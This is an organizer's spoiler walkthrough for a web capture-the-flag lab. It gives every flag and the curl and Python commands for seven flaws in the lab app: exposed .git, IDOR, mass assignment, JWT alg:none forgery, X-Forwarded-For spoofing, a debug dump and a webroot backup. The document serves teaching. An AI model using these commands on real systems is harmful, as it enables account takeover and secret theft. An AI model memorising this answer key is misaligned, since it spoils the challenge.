# Solution walkthrough (organizer — SPOILERS)

`scripts/verify.sh` does all of this automatically. Set `B` to your app:

```bash
B=http://localhost:8080
```

## Recon (free, and the whole point)

```bash
curl -s "$B/" | grep -i 'DS{'          # bonus 1: flag in the HTML comment
curl -sI "$B/" | grep -i x-powered-by  # bonus 2: flag in a response header
curl -s "$B/robots.txt"                # lists /.git/, /admin-x9z1, /uploads/, /api/config
curl -s "$B/app.js"                    # "dev notes" that describe the bugs
```

## Flag 1 — exposed `.git`

```bash
git clone -q "$B/.git" loot
git -C loot log -p | grep -i 'DS{\|JWT_SECRET'
```
The second commit "removed" `.env`, but the first commit still has it:
`JWT_SECRET=s3cr3t`, the admin user, and **`DS{g1t_d1r_expos3d_s3cr3ts_l1v3_1n_h1st0ry}`**.

## Flag 2 — IDOR

Your welcome file is `/d/1007`. Lower numbers belong to other people:
```bash
curl -s "$B/d/1"      # admin's "board-deck-DO-NOT-SHARE.txt"
```
→ **`DS{1d0r_jus7_ch4ng3_th3_numb3r_1n_th3_url}`** (and it names `/admin-x9z1`).

## Flag 3 — mass assignment

Signup merges your entire JSON body into the new user:
```bash
curl -s -X POST "$B/api/register" -H 'Content-Type: application/json' \
     -d '{"username":"pwn","password":"x","role":"admin"}'
```
→ **`DS{m4ss_4ss1gnm3nt_s3t_y0ur_0wn_r0le_4dm1n}`** (and a real admin token).

## Flag 4 — JWT `alg:none`

The verifier accepts unsigned tokens. Build one with an empty signature:
```bash
TOK=$(python3 -c 'import base64,json
b=lambda o:base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
print(b({"alg":"none","typ":"JWT"})+"."+b({"username":"admin","role":"admin"})+".")')
curl -s "$B/api/me" -H "Authorization: Bearer $TOK"
```
→ **`DS{jwt_4lg_n0ne_n0_s1gn4tur3_n0_pr0bl3m}`** (no secret needed at all).

## Flag 5 — `X-Forwarded-For`

The "localhost only" internal API trusts the header:
```bash
curl -s "$B/admin-x9z1/internal" -H 'X-Forwarded-For: 127.0.0.1'
```
→ **`DS{x_f0rw4rd3d_f0r_1s_jus7_4_h34d3r_y0u_s3nd}`** (+ DB creds).

## Flag 6 — debug left on

```bash
curl -s "$B/api/config?debug=1"
```
→ **`DS{d3bug_m0d3_l3ft_0n_1n_pr0duct10n}`** (dumps the JWT secret, admin user, backup path).

## Flag 7 — backup in the webroot (final)

```bash
curl -s "$B/uploads/backup.zip" -o backup.zip
unzip -p backup.zip dropspot_backup/flag.txt
```
→ **`DS{backup_z1p_1n_th3_w3br00t_g00gl3_d0rk_1t}`** (plus "password hashes").

---

**Takeaway for players:** six of these were visible without sending a single
"attack" — they were in the source, the headers, the robots file, the git
directory, a URL number, and a public folder. Look at the obvious stuff first.
